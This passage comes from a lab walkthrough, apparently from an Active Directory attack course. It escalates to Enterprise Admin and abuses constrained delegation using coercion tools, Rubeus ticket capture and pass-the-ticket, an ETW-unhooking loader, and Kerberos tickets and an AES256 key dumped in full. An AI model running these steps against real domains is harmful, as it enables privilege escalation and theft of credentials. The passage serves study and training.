* C:\Users\student731>C:\AD\Tools\DFSCoerce-andrea.exe -t dcorp-dc -l dcorp-appsrv
```
[*] Attempting to coerce auth on ncacn_np:dcorp-dc[\PIPE\netdfs] and receive connection on: dcorp-appsrv
[+] DfsCoerce seems successful, check listener running on:dcorp-appsrv
```

### Escalation to Enterprise Admins
To get Enterprise Admin privileges, we need to force authentication from mcorp-dc. Run the below command to listern for mcorp-dc$ tickets on dcorp-appsrv.

* C:\Windows\system32> winrs -r:dcorp-appsrv cmd
* C:\Users\appadmin> C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args monitor /targetuser:MCORP-DC$ /interval:5 /nowrap
```
[+] Successfully unhooked ETW!
[+++] NTDLL.DLL IS UNHOOKED!
[+++] KERNEL32.DLL IS UNHOOKED!
[+++] KERNELBASE.DLL IS UNHOOKED!
[+++] ADVAPI32.DLL IS UNHOOKED!
[+] URL/PATH : http://127.0.0.1:8080/Rubeus.exe Arguments : monitor /targetuser:MCORP-DC$ /interval:5 /nowrap
[*] Action: TGT Monitoring
[*] Target user     : MCORP-DC$
[*] Monitoring every 5 seconds for new TGTs
```

### Use MS-RPRN on the student VM to trigger authentication from mcorp-dc to dcorp-appsrv
* C:\Users\student731> C:\AD\Tools\MS-RPRN.exe \\mcorp-dc.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
```
RpcRemoteFindFirstPrinterChangeNotificationEx failed.Error Code 1722 - The RPC server is unavailable.
```

Alternatively, we can also use MS-DFSNM or MS-WSP (note that we are not using FQDN of mcorp-dc in 
case of WSPCoerce).

* C:\Users\student731> C:\AD\Tools\DFSCoerce-andrea.exe -t mcorp-dc.moneycorp.local -l dcorp-appsrv.dollarcorp.moneycorp.local
```
[*] Attempting to coerce auth on ncacn_np:mcorp-dc.moneycorp.local[\PIPE\netdfs] and receive connection on: dcorp-appsrv.dollarcorp.moneycorp.local
[+] DfsCoerce seems successful, check listener running on:dcorp-appsrv.dollarcorp.moneycorp.local
```

* C:\Users\student731> C:\AD\Tools\Loader.exe -path C:\AD\Tools\WSPCoerce.exe -args mcorp-dc dcorp-appsrv.dollarcorp.moneycorp.local
```
[+] Successfully unhooked ETW!
[+++] NTDLL.DLL IS UNHOOKED!
[+++] KERNEL32.DLL IS UNHOOKED!
[+++] KERNELBASE.DLL IS UNHOOKED!
[+++] ADVAPI32.DLL IS UNHOOKED!
[+] URL/PATH : C:\AD\Tools\WSPCoerce.exe Arguments : mcorp-dc dcorp-appsrv.dollarcorp.moneycorp.local
[+] OleDbException - Error 0x80040718L
[+] Search query successfully sent to the target
```

### On the Rubeus listener, we can see the TGT of mcorp-dc$
```
[*] 9/28/2025 5:30:32 PM UTC - Found new TGT:

  User                  :  MCORP-DC$@MONEYCORP.LOCAL
  StartTime             :  9/28/2025 5:06:12 AM
  EndTime               :  9/28/2025 3:05:35 PM
  RenewTill             :  10/5/2025 5:05:35 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    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

[*] Ticket cache size: 1
```

As previously, copy the base64 encoded ticket and use it with Rubeus on student VM. 
Run the below command from an elevated shell as the SafetyKatz command that we will use for DCSync needs to be run from an elevated process.

* C:\Windows\system32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args ptt /ticket:doIF1jCCBdKgAwIBBaEDAgEWooIE0TCCBM1hggTJMIIExaADA...

```
[+] Successfully unhooked ETW!
[+++] NTDLL.DLL IS UNHOOKED!
[+++] KERNEL32.DLL IS UNHOOKED!
[+++] KERNELBASE.DLL IS UNHOOKED!
[+++] ADVAPI32.DLL IS UNHOOKED!
[+] URL/PATH : C:\AD\Tools\Rubeus.exe Arguments : ptt /ticket:doIF1jCCBdKgAwIBBaEDAgEWooIE0TCCBM1hggTJMIIExaADAgEFoREbD01PTkVZQ09SUC5MT0NBTKIkMCKgAwIBAqEbMBkbBmtyYnRndBsPTU9ORVlDT1JQLkxPQ0FMo4IEgzCCBH+gAwIBEqEDAgECooIEcQSCBG0zXOZM96mQ2TJz3I8pN5bb/745VeC7xe8Y/dF6KhYxos6R3jUpj0+okp/+J6OXF+d6bk5yLLFUk0EgK3CwfC4PHTmaXbS7qs9FUbLNRK6KbsQUENO04HiuipvzaUPZgC++R03pBSh/NAa6sVtcWxT3eOyOEQSy/4OVy7HN/MkY4ERFT7c8BV8sbeffU38uyUtx7TdqY2UE3/eZVn4N7o6MbM+PbwUIO7sLTu3CdNo/ZDaYnO0nNqCL1yRhFY3PaXDCoeJlgLpp6KX1pmJAWHvHPyQKjUYJvZSV3Q2+bJmd9AggNta3DTr1//x7XmYixniKNxWuiTj+5We6UFNhqOpV+8KrNsxyGr8uyRLU/kKwffsXSAXvlQChLAhiFSeNVJBHbIEAV8LPnhsRkQ4IWNOehOLxTsn2HlvNVD8+K98KAWbYsxETZRYAJQo0u1+K5IKDyRcRNG74zwhEuQ7RbT5syu8QMxNxrzBgFqoVYQERFe4v2XfgkQEDnNVwKSS1mAx72bPYwBdlOu384adxq2HJ0HW1XxK1F5ztRIMkxrNOu+C4kz8KnOAXraHz+4yqxA8IIN1AEdI4IMpNSFDRaC1YmZjvD67ZZszt7WCVToP+jywJ5mutwhdAA9UnT6EWpst6wMu+RkgEY5fT0ELLe7ElP8THAduBMN62wCxGu03C7HbUi20A9r6UUlAEiY8wOZr8/lTszYd57L1fP0/rgTqJdK3UUeD9ps571/gBvwxADeI/S0ZNJdxTjkBTl7TE7QwkEo1iHhvKB6Fhd9busqtaxxr2n6bptTf0fcyN+Ca0QBFgtsg3KRo1Y1MqAJldAxTGB2iGplQsvEKoMLnJ22npvJmS1Mk25hgQQaZ+Z4JJtwWjiiQGkjFtqwri8AIYcnCkr9QINSvQEDXwYuC+PWqYZFqLnORKYrPDdHMqojy5tr/ot2pviAfcWkimNrmEs3SmsTEI9F3APjs9a+3To4pXKX0OLAsg70ZCPJueMQZ4thb4PgG42MTr6u/KbOFLlWaSEoDGf1qd6RQNG0TDBsMRyF2VpIfeHyHbB8WCZVM2MbeuIQWCq8jW3vUFdmHfEWveQTqke9zZold0/dHg++KUW319Hj6ivtUChs7Bt+HnZFZDi9Am+PBQIK9iaXkp2xjSy//6RMl4KbPmyBtwtp4Pu6oS7O6X3q5p61TK3sDiOlmRI96Ctojxv2vq3oQJBH5QIOlSrGraCq1c7k9X3YYgGAb8CYhI7b/nra/kJZbzCrxa3DlzhwOLAUqSD6qyHQOOhFX4bWFB8vPb1YxkvdM5sziwtAB1HzbT6inUYDOXx4fyGe6x7vl5E11WpBpyFfj6XpZOcRUzVaLHAR1tiroR4sDLihRxse6kD2TAnC2NICrrN9mS4poc28JPXtGyXQKpxgtkBRz8RV3O7ohJm3C7BFtArVh+34/uk8gb3Bz7ynay3+PNha3uKfJyMwKRDyOv6UmCZMB2Jo7FGPmo4R/NESMSVRCTfMV0Rfpx56OB8DCB7aADAgEAooHlBIHifYHfMIHcoIHZMIHWMIHToCswKaADAgESoSIEIA4RtlJ49YJy89ouBx5xqjRU+Zut7YMLpGO7BJ7YDqUxoREbD01PTkVZQ09SUC5MT0NBTKIWMBSgAwIBAaENMAsbCU1DT1JQLURDJKMHAwUAYKEAAKURGA8yMDI1MDkyODEyMDYxMlqmERgPMjAyNTA5MjgyMjA1MzVapxEYDzIwMjUxMDA1MTIwNTM1WqgRGw9NT05FWUNPUlAuTE9DQUypJDAioAMCAQKhGzAZGwZrcmJ0Z3QbD01PTkVZQ09SUC5MT0NBTA==

[*] Action: Import Ticket
[+] Ticket successfully imported!
```

### We escalated to Enterprise Admins too!

### Learning Objective 16:
```
• Enumerate users in the domain for whom Constrained Delegation is enabled. 
  − For such a user, request a TGT from the DC and obtain a TGS for the service to which delegation is configured. 
  − Pass the ticket and access the service as DA. 
• Enumerate computer accounts in the domain for which Constrained Delegation is enabled. 
  − For such a user, request a TGT from the DC.
  − Obtain an alternate TGS for LDAP service on the target machine. 
  − Use the TGS for executing DCSync attack.
```

### To enumerate users with constrained delegation we can use PowerView. 
### Run the below command from a PowerShell session started using Invisi-Shell

* PS C:\AD\Tools> . C:\AD\Tools\PowerView.ps1
* PS C:\AD\Tools> Get-DomainUser -TrustedToAuth
```
logoncount               : 5
badpasswordtime          : 12/31/1600 4:00:00 PM
distinguishedname        : CN=web svc,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
objectclass              : {top, person, organizationalPerson, user}
displayname              : web svc
lastlogontimestamp       : 10/25/2024 3:37:34 AM
userprincipalname        : websvc
whencreated              : 11/14/2022 12:42:13 PM
samaccountname           : websvc
codepage                 : 0
samaccounttype           : USER_OBJECT
accountexpires           : NEVER
countrycode              : 0
whenchanged              : 10/25/2024 10:37:34 AM
instancetype             : 4
usncreated               : 38071
objectguid               : b7ab147c-f929-4ad2-82c9-7e1b656492fe
sn                       : svc
lastlogoff               : 12/31/1600 4:00:00 PM
msds-allowedtodelegateto : {CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL, CIFS/dcorp-mssql}
objectcategory           : CN=Person,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
dscorepropagationdata    : {12/5/2024 12:47:28 PM, 11/14/2022 12:42:13 PM, 1/1/1601 12:00:01 AM}
serviceprincipalname     : {SNMP/ufc-adminsrv.dollarcorp.moneycorp.LOCAL, SNMP/ufc-adminsrv}
givenname                : web
usnchanged               : 255349
lastlogon                : 10/25/2024 3:37:34 AM
badpwdcount              : 0
cn                       : web svc
useraccountcontrol       : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, TRUSTED_TO_AUTH_FOR_DELEGATION
objectsid                : S-1-5-21-719815819-3726368948-3917688648-1114
primarygroupid           : 513
pwdlastset               : 11/14/2022 4:42:13 AM
name                     : web svc
```

We already have secrets of websvc from dcorp-admisrv machine. We can use Rubeus to abuse that. 

### Abuse Constrained Delegation using websvc with Rubeus
In the below command, we request a TGS for websvc as the Domain Administrator - Administrator. Then 
the TGS used to access the service specified in the /msdsspn parameter (which is filesystem on dcorp-mssql)

* C:\Users\student731> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL" /ptt
```
[+] Successfully unhooked ETW!
[+++] NTDLL.DLL IS UNHOOKED!
[+++] KERNEL32.DLL IS UNHOOKED!
[+++] KERNELBASE.DLL IS UNHOOKED!
[+++] ADVAPI32.DLL IS UNHOOKED!
[+] URL/PATH : C:\AD\Tools\Rubeus.exe Arguments : s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL /ptt
[*] Action: S4U

[*] Using aes256_cts_hmac_sha1 hash: 2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7
[*] Building AS-REQ (w/ preauth) for: 'dollarcorp.moneycorp.local\websvc'
[*] Using domain controller: 172.16.2.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFwjCCBb6gAwIBBaEDAgEWooIErzCCBKthggSnMIIEo6ADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlD
      T1JQLkxPQ0FMoi8wLaADAgECoSYwJBsGa3JidGd0Gxpkb2xsYXJjb3JwLm1vbmV5Y29ycC5sb2NhbKOC
      BEswggRHoAMCARKhAwIBAqKCBDkEggQ1mfF+D7QBrzRlv6T88RI90kqqC51J7PNXw5iqF20LbBlF/Ji+
      1GaL2BX6C69Cec/4+mEadZI7Qe0QA6pNCP5DjLBtijqvpnIgcMCvWSVDHTaVNxg/BrfUNI1yBDrWcq9M
      2gELY7JzJ5FpMDFgkux05kfIC60ZR+Y6aNaPOhmIsRJWfmHgw4KJSbASN9Fouo92pH9UWg0f7CXGg7ky
      gxFlNdm2+NUj2RU3SumS36uEjp8zSzCf+yCq3Dp8XwEJr59n+dUDT4NQIuyMFjbODKk20giRsO6/lKe0
      J6Hk+/lDEi5Haz16DOIlfnvDZc/ew8s25/qGzhDTsJQ4j+twM2AAp/9/Hy8OGO5kDNC2MZcTAN6wFi/7
      xI+JUwF87FEJEJpomd37RQDp8Vdh2YNFR3inYdg83o647mD76e9IaX2iyaKD+7abzS8CZpGHRBJPRsPp
      JU9KGyVoIjm2sbfx5oaoL6qvKw7glAGHcPGX9KS3dxHid4b956OUd+G8iU5uLQqEBVcpvv67hgPuEyqj
      4FLjT8643AhaQudcnicCpXePjulHtnO1j4C2PIerON/C7KIhJW9TUylVoEeE6V7L56v708G6guOuIKsD
      YKwEH/trBpkjsNKl1y5oH6DHNVraQyF7gCJOYuyiq/6YAq6VjQXS0F4LnujcPDpw5YGyf0TH6l2Tsmsb
      1WkNXOSXvryxQezZGSuBYRvUJivjt71Y/d1wj5pNJ48xNoEFeYeVLH2SY3vxU05KzvcKmEGFQtD3v7IQ
      FEhWmyZxt5xbYEM0HLhihVpdStymQ5bDifchivYSX/ViyCpjGPfN1a6ii07QmdTiJ4PipxaAVq0BMGdG
      6FmVyn4NJKP8PwqIQ0AZc9S9MV6yQSI7F76V/dK8GN7nuwDqW+Pk0MZlVRY7VtqLkNbyyvKyHMjReWxx
      d6spv/ay8Qw8SuTmC0jPE141+sCTdut0GJ4Fff0jVkOEd87rTIz8Nri3dO4qHpd8kAvOJszA2jKSys3V
      LHki1gkPAh8Fab8LqQ+P7PiF+YjdGPFUu6I30eO/V5dn3QGYdocxPJSje+4SS5LTLAKz0goLeOmOnKpq
      /9lpmEh/VsZ6Muxs50cYZ8tKR6beO7UYbWEjy7M68jnWlC9P7zUGmq3L9pfgG8RcwAAz4zghfzaAOeT+
      qacZh+wxW2TGyK/3ZkXhPwccEsFdGbBDastYvLcCSS80KIWx5v1bLyjXeCFnuCzBAhknmMlVnI6RJtHd
      6A1DihJqD2Yz6XkPv2tWcUI5btvB4LX412Q7iglQoctjZu0RwZ/WRmrCWj2qswkYPU01w3SN6AjvL3p8
      A0Z5KXLwspAP+H75xqBbIdNpis8iwv6aURfqiQ+I0y6r/lV4/5T7iXUt7iC9g9cHnyb+P+LB3VAQkm0l
      gE+DQZDU+8X9x5jDsovr67OHzB59o4H+MIH7oAMCAQCigfMEgfB9ge0wgeqggecwgeQwgeGgGzAZoAMC
      ARehEgQQUnyYFRwssyFQd76G2AnihKEcGxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKITMBGgAwIB
      AaEKMAgbBndlYnN2Y6MHAwUAQOEAAKURGA8yMDI1MDkyODE3NTQ1M1qmERgPMjAyNTA5MjkwMzU0NTNa
      pxEYDzIwMjUxMDA1MTc1NDUzWqgcGxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKkvMC2gAwIBAqEm
      MCQbBmtyYnRndBsaZG9sbGFyY29ycC5tb25leWNvcnAubG9jYWw=


[*] Action: S4U

[*] Building S4U2self request for: 'websvc@DOLLARCORP.MONEYCORP.LOCAL'
[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[*] Sending S4U2self request to 172.16.2.1:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'websvc@DOLLARCORP.MONEYCORP.LOCAL'
[*] base64(ticket.kirbi):

      doIGTDCCBkigAwIBBaEDAgEWooIFPjCCBTphggU2MIIFMqADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlD
      T1JQLkxPQ0FMohMwEaADAgEBoQowCBsGd2Vic3Zjo4IE9jCCBPKgAwIBF6EDAgECooIE5ASCBODsggZ1
      iohUnP3tH84S+JztannQ9uHmoCpMKNuqTPDlXwt8Zi6JF41kYmSYzkiO4MwOu9JEIlBAG2hsLGrC2I8W
      2MNACcPY3CtkWHiQViyWnS/SPcPFgx4CDznxcomgoCViwsDxnoNeL8s9Mfmj0ZUZF+XYGI3djtQsPoI0
      eEiqOEU0asVVOxzGKfMM/bqkHtf8EmWfwXfgKxdNgvS6rRS6XfqzR5j8+vwAP2DiOKEIaOS+CzwUd0Wc
      s+ewEGJvTnoK1FhabybgSBsni2UWpWx04loFZjaYURcH/LqAppz2dddXhhVk+rAcdVrr0QgGotI6AvyD
      3wEaEBTIQ1jncPO+VwDvm85XAuNRJPM7tQypLM/UlEYgPr0yiis24qhRS6NdZaugDfh8W9LSZRSO8meR
      Uc4ExbntaiEOeVwK2oSR4fb6A9xO31XitF3YAqS0hFP5HOy0d9c3p3uXmG0XZYm8H5noBYL30ngn6ym7
      DBGnLCiHWLrzD1qDPUXFssz2wx7mbTPaO/Z/Pu4pq+TuAbBUBeuJXOXZHvwuCsSjfyy3GVPBdyQdFRCB
      4gxrbqz6uj8Qnw+g57RAFxzQ87pmTHHIIGQt4v4CY8pKLTLPteDU8D6AkK9vA0qHL3lva/T1lmpx0Olx
      lthXZPyAmNMFqmG0HkjXwjlnOzSDoZ5djRFbdXFUuQTZcoCL+AlWgi1E/lJ40MrnA/GT3+SYU3C5v/I1
      SLDqPpipPmY8PhwMs894HhBFrXkbJo1ldv+Ov/A3PNOLde9cycJYi2t+7eIIskwTno94uc2sI2QcNJo2
      NtvVdYb/yJoGU7K1FFFPwoL+hhFVhTPZKj2S4WiRbLomXaXD05BtIjtvHYH40OGM3hvueOj5TQ2krQvE
      NOdYCSc01q1IBleIQOFcINPCKbLV47V3lPqOzzyjXzU9W1mRHAtxVfrkc5zILYc4/+jKV2OIC/dMcSyB
      3eCJPjUJ+1H9nzyGAXeBhBtH5g5Z0misyY0twUnC2aXBwBXiEOr2UvQToehzkLlsfMnpHwiq9q2IRulH
      0wSyjf0FDAU6T6yzp4pZaTkbJcW2/CYfni9QpXf88WXrCj8wHmi8SvVfqNi2AVfWzWlH81af9NfzODeP
      Go25ls0S7fPDTzPuEvmMBvCMn5s2N4WgW8CfNY48Foeib3d83u9jsLCZ86ioA0zuXaEyjEseVQQAdSks
      1lWJsBdB6/HBheYxjaOY+1d1KJCXIsZqKq3ttaL2RGMqtOB9fvaDICLYeU+r8OvmA4DSjTN/VQhStBXr
      FoOc6DYL/qALZKxN6qsD4rOWSLiS90xnxE1MD9SFhO4dk7G/hCxtOiMxNKyXDh0NW40FHo4zv6a+LJCq
      WxFHZlUbtcCWEQlkETZl0DGvEduchO4W7LzSpGk3tQtXsdZZ9xhsy0YXfSMxmmtmbxEhCzQDpxhdSAex
      kScYXe2LjelJembkZ7g1Gt8zJe0Sz+sL4trGVz/i5UHEsNt/P1u3utiqHudlD4GMg2yKB2tJ38FD//rF
      FCn59qhgs8fGxbC+Xj/B4wV+c0NBijpWrxKjCE4up7qMC+A+izlh6dO2k+DUldGUyGzbdSjfnriGyaPc
      mWmYuR0dW3RVjvOZoHWHqiOiE7+4Uu72vYvDMIPBB8XHyEVWTKxF7ImszJejgfkwgfagAwIBAKKB7gSB
      632B6DCB5aCB4jCB3zCB3KArMCmgAwIBEqEiBCBVmf0gbKac1TPuL+RNEIGoIXq7fm8X31DJxI1qsWnB
      iaEcGxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKIaMBigAwIBCqERMA8bDUFkbWluaXN0cmF0b3Kj
      BwMFAEChAAClERgPMjAyNTA5MjgxNzU0NTNaphEYDzIwMjUwOTI5MDM1NDUzWqcRGA8yMDI1MTAwNTE3
      NTQ1M1qoHBsaRE9MTEFSQ09SUC5NT05FWUNPUlAuTE9DQUypEzARoAMCAQGhCjAIGwZ3ZWJzdmM=

[*] Impersonating user 'Administrator' to target SPN 'CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL'
[*] Building S4U2proxy request for service: 'CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL'
[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[*] Sending S4U2proxy request to domain controller 172.16.2.1:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL':

      doIHcDCCB2ygAwIBBaEDAgEWooIGSDCCBkRhggZAMIIGPKADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlD
      T1JQLkxPQ0FMojkwN6ADAgECoTAwLhsEQ0lGUxsmZGNvcnAtbXNzcWwuZG9sbGFyY29ycC5tb25leWNv
      cnAuTE9DQUyjggXaMIIF1qADAgESoQMCAQGiggXIBIIFxJg0usSgEprzPxQlpW/EFB25PY9GRbfYMJve
      7xrc2c67tx1ILGOMoNo/G8lLvbP31FEHVLzpoNmcBICsP3Vt/DnzXoBMgdBEEiTG3Z5JmOme9ybKUf0V
      xGnhDtvKAgk8XVUhCKqPE4dkRBjqrL+1q9uleCPBtqgvZ4BFO8GV/Mq4LuSKOOnV+rf3x5W3qkvy5MfA
      5s/PKIMPGi5t3hh6V+3vwYT4unOzYGO2N5wNG2VfkO8bAj80biwkMvDR2RAWm06LLf19hcJ/8JKHj+81
      PdmgCslbLp95vaHvXmRpa5fgi1Ojp+ydKf/tDxdPpHeFTpk60rI2IinNN8GhqNKyo/+1ESNSc5i/KJqn
      XW2tT8f2aIqt5KjJELClq05hTqW5QAp52hMsi8lm171esslp7O5EIoHMOPAPPyqeolimYYRylVzyCQFF
      SrR2NgbLJrmIkk3CGpH8N7ZCzuFgmGHNGGTMnfUYN7j2LeQMjaQy53/hRxGlnICDX0B+u03agR3zR7Hq
      l/BcI122+FLGsjMQ7phDgsXbmZwhMcxdKqvfKdDelYDu8+oI6fXboqM07NjpBpCUh/Em+ABDrWkDYPhF
      a871eHiBMdmLaNMLpnnGZs1az9fX3p5sbjLWb/aOGDr1bE3U0IIj+3fcZIKyRAfayvwKSUr2kWyg06ja
      KHl97yZiyaQn+8yU+qpKo19sYTwtIx6vi8sNS5EsDj/ewC2oFwYTWcjeGsRciKBP90lvL/k6uIZclj3l
      3HMduVoElvSUB5FF3E8Qjnv54i773MbA62j/VIrvXtR0PfH8bKpUsXvy5UoxSgHBXqQwuj91paIeRQe5
      vI5XXO2GwGH91jBRp0eALuJBXlQ5v9XRkr9OYHoTPzzr7URwjQqyNcHCOsMz8LImZe9cPMIdrakGn3RZ
      BU9OSjzAbHP2Ktbh3Ub1T/b/NFmtqXmB9ZGs1ExUoUIEHxN9i/4Er4rWh4OBkSFOClLqGkmGY+ccYplO
      1Ke6sideiaAd0xfVQFOkWcfP5/pR2MXT914jRbYithV3eOqfrvExLmyD3v2qLjCO48WYZO5UGoTBH1ws
      Am9WkSDCSpqpDN9+imyMSpU3w8AlpSscyLk+eCqv/kuPIgVlEtUMuVRwnEwX6FVJ3gN3WiQmCDPWrfqN
      47tGy3iMWV1tUMLzq0pWm3l3969u5Fcj/448LsKOX9Ctw1We8imxn6dTq3lREEa/D+/DQylwGbMDdMBq
      Ej3PloK/GZd9/MtVj5O7gxKFbwuZJXpeXK1ffb8uMRtA4cxdS6l7UNLcHzLKSTBcTp5ohuPp2jxdYptF
      GU6aTn7Zvu6RuUqXLSvQzqPmAi2MvrVZTgqtEEKCrmUCseWhSsbn5V60GFmYHh1n+SsD2ZWvjAvm9I6L
      4yYroOiww+bVrSA+CcT+teKW0uaepZdQrCs+aSNCjawyBjGoE3drtsgDDsm5PYR+TvGZVWhW71uaHBES
      N3gzL5lv/xXqgpnqCNmInwI0Rfz+U6E9kIPvLhkvQmq1a59gvCTt3St6JO1IJFM4/xHjenUVIaozlSTC
      yqsNqD/ozjvdxpDpfWtEJDyT4PLlvkr6J2w+ldE0DEsAFQrwaT7FCEdqc0RElqFwGCU0gsRK7P6syNqb
      YwT5K9tPBLyK5bD49cZQdbwO3wJepbfFD+gVNiuZf0rHRhERBoNMcxKnZ0RCRzoCbIuVZxNsqpuoJPNr
      QkurG6r3TTICPF3UWAh/kQ0JEJ7GFhx9eGvwiM4lDDHrFnT1D0LyObOLpqOe2IfKS46qCHq6VUDE4LPI
      xmT9/l4kT9HckxB16BaOs9Op19nKAQLyeZ1lcWaTOg3FKzpCQB6T/jLuRfy//zJ4uSkQnCz6p+OhZXA3
      U9g+VzBIimjCVXxNVUkU6QaeXIT/CfO4GI9YgEsnE2BU2+fCf7eFhopnLk3YiW/+qgfMYkN7Sy+L4bex
      g4wK8snXCXKT46OCARIwggEOoAMCAQCiggEFBIIBAX2B/jCB+6CB+DCB9TCB8qAbMBmgAwIBEaESBBCd
      d1kvIQOYNU6qdsVqVxMcoRwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMohowGKADAgEKoREwDxsN
      QWRtaW5pc3RyYXRvcqMHAwUAQKEAAKURGA8yMDI1MDkyODE3NTQ1NFqmERgPMjAyNTA5MjkwMzU0NTNa
      pxEYDzIwMjUxMDA1MTc1NDUzWqgcGxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKk5MDegAwIBAqEw
      MC4bBENJRlMbJmRjb3JwLW1zc3FsLmRvbGxhcmNvcnAubW9uZXljb3JwLkxPQ0FM
[+] Ticket successfully imported!
```

### Check if the TGS is injected

* C:\Users\student731>klist
```
Current LogonId is 0:0x506b9

Cached Tickets: (1)

#0>     Client: Administrator @ DOLLARCORP.MONEYCORP.LOCAL
        Server: CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 9/28/2025 10:54:54 (local)
        End Time:   9/28/2025 20:54:53 (local)
        Renew Time: 10/5/2025 10:54:53 (local)
        Session Key Type: AES-128-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
```

### Try accessing filesystem on dcorp-mssql

* C:\AD\Tools> dir \\dcorp-mssql.dollarcorp.moneycorp.local\c$

```
 Volume in drive \\dcorp-mssql.dollarcorp.moneycorp.local\c$ has no label.
